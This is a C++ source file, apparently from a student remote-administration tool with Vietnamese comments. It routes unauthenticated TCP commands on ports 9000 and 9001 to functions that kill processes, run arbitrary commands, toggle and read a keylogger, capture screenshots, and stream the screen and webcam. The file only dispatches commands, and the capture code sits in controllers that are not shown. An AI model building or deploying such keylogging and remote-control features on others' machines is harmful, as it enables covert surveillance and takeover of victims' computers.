// CommandRouter.cpp (FIXED: REMOVED RECORDING LOGIC)
#include "CommandRouter.h"
#include "utils/helpers.h"
#include "utils/logging.h"
#include <sstream>
#include <stdexcept>
#include <mutex>

using namespace std;

CommandRouter::CommandRouter() {}

// === 1. HAM XU LY LENH (CONG 9000) ===
void CommandRouter::handleCommandClient(SOCKET client)
{
    logConsole("CMD_TCP", "Gateway da ket noi Cong Lenh.");
    char buffer[4096];
    string line_buffer;

    try
    {
        while (true)
        {
            int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
            if (rec <= 0)
                break; // Gateway ngat ket noi
            buffer[rec] = 0;
            line_buffer += buffer;
            size_t pos;
            while ((pos = line_buffer.find('\n')) != string::npos)
            {
                string cmdLine = line_buffer.substr(0, pos);
                line_buffer.erase(0, pos + 1);

                size_t idPos = cmdLine.find('|');
                if (idPos == string::npos)
                    continue;

                string correlationId = cmdLine.substr(0, idPos);
                string cmdOnly = cmdLine.substr(idPos + 1);

                logConsole(correlationId, "Nhan lenh: " + cmdOnly);
                vector<string> args = splitArgs(cmdOnly);
                if (args.empty())
                    continue;
                string cmd = args[0];

                // === DIEU PHOI ===

                if (cmd == "GET_PROCS")
                    sendCmdTcp(client, correlationId, "JSON " + m_processController.getProcessesJson(), m_socketMutex);
                else if (cmd == "GET_APPS")
                    sendCmdTcp(client, correlationId, "JSON " + m_appController.getAppsJson(), m_socketMutex);
                else if (cmd == "KILL_PID" && args.size() > 1)
                    sendCmdTcp(client, correlationId, "JSON " + m_processController.killProcess(args[1]), m_socketMutex);
                else if (cmd == "CLOSE_HWND" && args.size() > 1)
                    sendCmdTcp(client, correlationId, "JSON " + m_appController.closeApp(args[1]), m_socketMutex);
                else if (cmd == "START_CMD" && args.size() > 1)
                {
                    string fullCmd = cmdOnly.substr(cmd.length() + 1);
                    sendCmdTcp(client, correlationId, "JSON " + m_appController.startApp(fullCmd), m_socketMutex);
                }
                else if (cmd == "POWER_CMD" && args.size() > 1)
                    sendCmdTcp(client, correlationId, "JSON " + m_systemController.powerCommand(args[1]), m_socketMutex);
                else if (cmd == "KEYLOG_SET" && args.size() > 1)
                {
                    m_keylogController.setKeylog(args[1] == "true");
                    sendCmdTcp(client, correlationId, "JSON {\"ok\":true}", m_socketMutex);
                }
                else if (cmd == "GET_KEYLOG")
                    sendCmdTcp(client, correlationId, "JSON " + m_keylogController.getKeylog(), m_socketMutex);
                else if (cmd == "GET_DEVICES" || cmd == "REFRESH_DEVICES")
                {
                    bool refresh = (cmd == "REFRESH_DEVICES");
                    sendCmdTcp(client, correlationId, "JSON " + m_deviceController.getDevices(refresh), m_socketMutex);
                }
                else if (cmd == "GET_SCREENSHOT")
                    sendCmdTcp(client, correlationId, "JSON " + m_screenController.getScreenshotBase64(), m_socketMutex);

                // DA XOA: RECORD_VIDEO va DELETE_VIDEO vi logic nay chuyen xuong Client
            }
        }
    }
    catch (const std::exception &e)
    {
        logConsole("CMD_TCP", "LOI: " + string(e.what()));
    }
    catch (...)
    {
        logConsole("CMD_TCP", "LOI KHONG XAC DINH!");
    }
    logConsole("CMD_TCP", "Gateway da ngat ket noi Cong Lenh.");
    closesocket(client);
}

// === 2. HAM XU LY STREAM (CONG 9001) ===
void CommandRouter::handleStreamClient(SOCKET client, string clientIP)
{
    logConsole(clientIP, "Gateway da ket noi Cong Stream.");
    char buffer[1024];
    try
    {
        int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
        if (rec <= 0)
        {
            closesocket(client);
            return;
        }
        buffer[rec] = 0;
        string cmdLine(buffer);
        size_t pos = cmdLine.find('\n');
        if (pos != string::npos)
            cmdLine = cmdLine.substr(0, pos);

        vector<string> args = splitArgs(cmdLine);
        if (args.empty())
        {
            closesocket(client);
            return;
        }

        string cmd = args[0];
        logConsole(clientIP, "Nhan yeu cau Stream: " + cmd);

        if (cmd == "START_STREAM_SCREEN")
        {
            m_screenController.handleScreenStream(client, clientIP);
        }
        else if (cmd == "START_STREAM_CAM" && args.size() > 2)
        {
            // args[1] la ten camera, args[2] la audio (server bo qua audio)
            m_deviceController.handleStreamCam(client, clientIP, args[1], args[2]);
        }
    }
    catch (const std::exception &e)
    {
        logConsole(clientIP, "LOI STREAM: " + string(e.what()));
    }
    catch (...)
    {
        logConsole(clientIP, "LOI STREAM KHONG XAC DINH!");
    }

    logConsole(clientIP, "Gateway da ngat ket noi Cong Stream.");
    closesocket(client);
}